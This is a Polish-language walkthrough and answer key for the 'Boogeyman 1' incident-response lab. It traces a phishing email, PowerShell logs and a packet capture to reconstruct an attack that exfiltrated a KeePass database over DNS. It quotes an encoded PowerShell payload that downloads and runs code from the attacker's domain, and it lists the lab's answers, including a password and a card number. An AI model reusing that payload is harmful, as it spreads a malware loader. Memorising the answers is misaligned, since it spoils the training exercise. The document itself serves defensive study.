#Boogeyman 1
TASK1
W boxie tym naszym zadaniem jest przeanalizowanie TTPs'a wykonanego na maszynie.
Całe zadanie zostało podzielone na 3 etapy:
Etap1 - Analiza maila phishingowego
Etap2 - Analiza logów powershella
Etap3 - Analiza logów pakietów internetowych

---
## Task1
**Q:** Let's hunt that boogeyman! </br>
**A:** No answer needed

---



TASK2
Q: What is the email address used to send the phishing email?

W: Przechodzimy do folderu z artefaktami, znajdujemy plik dump.eml który otwieramy w aplikacji thunderbird mail. Informacje o nadawcy maila możemy uzyskać bez głębszego analizowania maila, wartość dla pola From:.

A: agriffin@bpakcaging.xyz



Q: What is the email address of the victim?

W: Informacje o odbiorcy maila możemy zauważyć bez glębszego analizowania maila, wartość dla pola To:.

A: julianne.westcott@hotmail.com



Q: What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

w: Przechodzimy do More>Show Source, wyszukujemy pole DKIM-Signature, nazwa serwisu znajduje sie w polu p=.

A: elasticemail


Q: What is the name of the file inside the encrypted attachment?

W: Pobieramy załącznik i rozpakowywujemy go na spreparowanym sandboxie przy użyciu hasła zawartego w mailu.

A: Invoice_20230103.lnk


Q: What is the password of the encrypted attachment?

W: Hasło znajdujemy bezpośrednio w mailu.

A: Invoice2023!



Q: Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

W: Uruchamiamy cmd, przechodzimy na Desktop, wykonujemy komende lnkparse nazwa_pliku. Informacja o komendzie możemy dostrzec w polu Command line arguments po fladze -enc.

A: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==





TASK3

Q: What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

W: Uruchamiamy cmd w folderze zawierajacym artefakt jsona, wykonujemy komende:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq
W polu ScriptBlockText $s= możemy zauważyć pierwsza domene ktora posłużyła do ataku, następną domene możemy odczytać poniżej.

A: cdn.bpakcaging.xyz,files.bpakcaging.xyz



Q: What is the name of the enumeration tool downloaded by the attacker?

W: Nazwe pobranego narzędzia możemy dostrzec po uruchomieniu tej samej komendy, wyszukujemy w treści wartość .exe

A: seatbelt



Q: What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

W: W tym samym miejscu możemy odszukac wartosc zależne od sq3.exe, w tym sqlite.

A: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite



Q: What is the software that uses the file in Q3?

W: W tym samym miejscu możemy zauważyć wiele wspomnień dla MicrosoftStickyNotes, również w tym gdzie plik wykonywalny został zapisany.

A: Microsoft Sticky Notes



Q: What is the name of the exfiltrated file?

W: W tym samym miejscu, szukamy gdzie dane mogłybyć zapisane, jest to jeden z końcowych etapów ataków więc informacji o tym szukamy na końcu logów.

A: protected_data.kdbx



Q: What type of file uses the .kdbx file extension?

W: Informacje o tym możemy znaleść w zewnętrznych źródłach.

A: keepass



Q: What is the encoding used during the exfiltration attempt of the sensitive file?

W: Informacje o tym możemy znaleść w miejscu gdzie dane są wysyłane, np w tym samym ciagu co metoda POST, odnajdujemy informacje o tym na poczatku, w polu ScriptBlockText $split = 

A: hex



Q: What is the tool used for exfiltration?

W: W tym samym miejscu co kodowanie możemy znaleść informacje o narzędziach użytych do wysłania danych.

A: nslookup



TASK4

Q: What software is used by the attacker to host its presumed file/payload server?

W: Uruchamiamy capture.pcapng przy użyciu Wiresharka, wiemy nazwe pliku oraz to ze zawartosc zostala przeslana poprzez protokół http. Filtrujemy ruch poprzez filtr:
http contains "files.bpakcaging.xyz", dostrzegamy 5 pakietów. Przechodzimy na początek, prawy na pakiet, Follow > TCP Stream. Podążanie za potokiem pakietu z początku ataku pozwala na dokładną analizę komunikacji podczas ataku. W wartosc przesyłanych przez serwer w polu Server: możemy dostrzec oprogramowanie serwera

A: python



Q: What HTTP method is used by the C2 for the output of the commands executed by the attacker?

W: Informacja o tym dostępna była w poprzednim zadaniu, wiemy, że atakujący przysyłał dane poprzez POST'a

A: POST



Q: What is the protocol used during the exfiltration activity?

W: Informacja o tym dostępna była w poprzednim zadaniu, wiemy, że atakujący przysyłał dane poprzez nslookup czyli protokół dns'a

A: dns



Q: What is the password of the exfiltrated file?

W: W poprzednich zadaniach mogliśmy dostrzec plik sq3.exe który posłużył do zebrania danych z urządzenia.
Otwieramy Wiresharka oraz nasz plik pcapng, wyszukujemy pakietów które zawierają ten plik czyli filtr:
http contains "sq3.exe". Dostrzegamy 4 pakiety. Śledzimy Potok TCP pierwszego, możemy zauważyć, że numerem tego potoku jest 749, sprawdzamy co stało się następnie czyli dla potoku o numerze 750.
Dostrzegamy zakodowany ciąg liczbowy. Wprowadzamy ten ciąg do CyberChefa z wyszukiwaniem jakim algorytmem został zakodowany czyli operacja "Magic". Otrzymujemy entropie 5.33 dla kodowania From_Decimal('Space',false). Stosujemy tą operację zamiast Magic, uzyskujemy tym samym jawne dane, w tym hasło które posłużyło do zakodowania bazy danych.

A: %p9^3!lL^Mz47E2GaT^y



Q: What is the credit card number stored inside the exfiltrated file?

W: W celu uzyskania informacji o karcie, musimy odczytać tą zawartość z bazy danych.
Możemy zastosować następującą komende w cmd:
tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" | cut -f1 -d '.'|grep -v -e "files" -e "cdn" | uniq | tr -d '\\n'
która odczyta plik pcap, nałoży filtr dns a następnie odpowiednio podzieli dane tabel. Tak uzyskany ciąg tekstowy musimy odkodować z hexowego np w cyberchefie. Zapisując wyniki z cyberchefa w formie nazwapliku.kdbx pozwala na uzyskanie dostepu do bazy danych poprzez program KeePassX wraz z podaniem hasła które uzyskaliśmy w poprzednim pytaniu.


A: 4024007128269551


